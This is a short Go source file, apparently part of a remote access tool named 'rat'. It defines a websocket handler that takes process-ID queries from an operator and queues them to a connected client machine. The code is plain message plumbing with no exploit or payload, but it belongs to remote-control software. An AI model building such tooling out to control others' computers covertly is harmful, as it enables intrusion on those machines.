package main

import (
	"encoding/json"
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type ProcessQueryMessage struct {
	Type int   `json:"type"`
	PIDs []int `json:"pids,omitempty"`
}

type ProcessMessage struct {
	PID  int    `json:"pid"`
	Path string `json:"path"`
}

func (d ProcessQueryMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	var j ProcessQueryMessage
	json.Unmarshal([]byte(data), &j)

	client.Listeners[header.ProcessHeader] = ws

	pids := []Process{}

	for _, pid := range j.PIDs {
		pids = append(pids, Process{PID: pid})
	}

	client.Queue <- &ProcessPacket{j.Type, pids}
	return nil
}
